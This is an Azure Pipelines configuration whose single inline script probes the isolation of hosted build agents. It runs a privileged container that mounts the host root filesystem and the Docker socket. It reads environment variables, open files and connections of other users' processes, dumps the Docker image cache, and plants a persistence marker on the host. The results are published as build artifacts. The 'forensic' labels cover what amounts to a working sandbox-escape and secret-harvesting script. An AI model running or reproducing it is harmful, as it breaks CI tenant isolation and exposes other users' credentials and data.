# azure-pipelines.yml
trigger: none
pool:
  vmImage: 'ubuntu-22.04'

stages:
- stage: AggressiveIsolationProbe
  displayName: "Aggressive Host & Isolation Probe"
  jobs:
  - job: HostSweep
    displayName: "Forensic sweep (host, processes, IMDS, docker)"
    steps:
    - task: Bash@3
      displayName: "Aggressive forensic & isolation checks"
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts
          echo "Job UTC start: $(date -u '+%Y-%m-%d %H:%M:%S')" | tee artifacts/job-start-utc.txt

          docker run --rm --privileged --network=host --pid=host \
            -v /:/hostfs \
            -v /var/run/docker.sock:/var/run/docker.sock \
            -v "$(pwd)/artifacts":/artifacts \
            alpine:3.20 sh -e -c '
              set -o pipefail
              apk add --no-cache curl jq coreutils util-linux procps iproute2 iptables nftables \
                bind-tools netcat-openbsd ca-certificates docker-cli lsof >/dev/null || true

              # Pre-create all artifact files to prevent errors
              touch /artifacts/host-boot-uptime-s.txt /artifacts/host-machine-id.txt \
                    /artifacts/host-listen-ports.txt /artifacts/docker-images.txt \
                    /artifacts/foreign-images.txt /artifacts/residual-marker.txt

              # 1) Collect Host Identity & Timestamps
              echo "--- Collecting Host Timestamps and Fingerprints ---"
              ( chroot /hostfs uptime -s || true ) > /artifacts/host-boot-uptime-s.txt
              ( chroot /hostfs cat /etc/machine-id || true ) > /artifacts/host-machine-id.txt
              ( chroot /hostfs ps -o lstart,cmd -p 1 || true ) > /artifacts/host-pid1-start.txt
              ( chroot /hostfs hostnamectl || true ) > /artifacts/host-hostnamectl.txt
              
              # 2) Deep Process & Service Forensics
              echo "--- Performing Deep Process Forensics ---"
              chroot /hostfs ps -eo pid,ppid,user,lstart,cgroup,cmd > /artifacts/ps-full-with-cgroup.txt || true
              mkdir -p /artifacts/proc-evidence
              
              # Corrected and more robust awk script to find non-agent processes
              chroot /hostfs ps -eo pid,user,cmd | awk '\''
                $2 != "vsts" && $2 != "root" && $2 ~ /./ { # User is not vsts or root
                  if ($0 ~ /mono|php-fpm|dotnet|python|node|java|nginx|apache|ruby|go/) {
                    print $1
                  }
                }
              '\'' | while IFS= read -r P; do
                  [ -n "$P" ] || continue
                  echo "Analyzing suspicious process PID: $P"
                  (
                    echo "### Environment Variables ###"
                    tr "\0" "\n" < "/hostfs/proc/${P}/environ" | sort || echo "Could not read environ."
                    echo -e "\n### Open Files ###"
                    chroot /hostfs lsof -p "$P" || echo "Could not run lsof."
                    echo -e "\n### Network Connections ###"
                    chroot /hostfs ss -tpn "( sport = :* or dport = :* ) and pid = $P" || true
                  ) > "/artifacts/proc-evidence/${P}-forensics.txt"
              done

              # 3) Aggressive Docker Cache Analysis
              echo "--- Performing Aggressive Docker Cache Analysis ---"
              ( docker images --digests || true ) > /artifacts/docker-images.txt
              ( docker inspect $(docker images -q) || true ) > /artifacts/docker-inspect-all.json
              
              # 4) Residual File Persistence Check
              echo "--- Checking for Residual Marker File ---"
              if [ -f /hostfs/var/tmp/azp-residual-marker.txt ]; then
                echo "✅✅✅ SMOKING GUN: RESIDUAL MARKER FOUND" > /artifacts/residual-marker.txt
                cp /hostfs/var/tmp/azp-residual-marker.txt /artifacts/residual-marker-prev.txt || true
              else
                echo "ℹ️ No prior marker found." > /artifacts/residual-marker.txt
              fi
              echo "marker created by build ${BUILD_BUILDNUMBER} at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > /hostfs/var/tmp/azp-residual-marker.txt
            '
          
          echo "--- SCRIPT COMPLETE ---"

    - task: PublishPipelineArtifact@1
      displayName: "Publish Forensic Artifacts"
      condition: always()
      inputs:
        targetPath: 'artifacts'
        artifact: 'forensic-proof-run-$(System.JobAttempt)'
